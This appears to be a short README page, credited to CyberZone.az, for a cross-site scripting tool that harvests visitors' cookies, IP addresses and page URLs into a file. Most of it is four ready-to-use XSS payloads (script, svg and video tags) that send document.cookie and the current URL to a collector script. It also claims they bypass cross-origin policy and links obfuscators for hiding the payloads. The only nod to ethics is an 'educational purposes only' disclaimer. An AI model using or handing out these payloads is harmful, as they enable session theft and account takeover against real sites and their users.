<h2>For educational purposes only, use at your own responsibility.</h2>

<p>This script gets  all cookies, ip address and url from vulnerable site and stores it in data.txt.</p>

<p>Here same payload examples for usage.</p>

    <sCRiPt>new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;</sCRiPt>

    <svgonload=setTimeout(function(a){a=document.createElement(`img`);a.src=`https://localhost/getCookies.php?       u=${document.location.href}&c=${document.cookie}`;document.getElementsByTagName(`body`)[0].appendChild(a);},500);>

    <video autoplay onloadstart="new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;" src=x></video>

    <sCRiPt>new Image().src="https://localhost/getCookies.php?u="+document.location.href+"&c="+document.cookie;</sCRiPt>

<p>These examples in above is written for bypassing cross site origin policy in all browsers but you can use your own payload instead.</p>
<p>For encrypting your payload:</p>
<a href="https://obfuscator.io/">obfuscator.io</a>
<a href="http://www.jsfuck.com/">jsfuck.com</a>

From: <a href="https://cyberzone.az/">CyberZone.az</a>
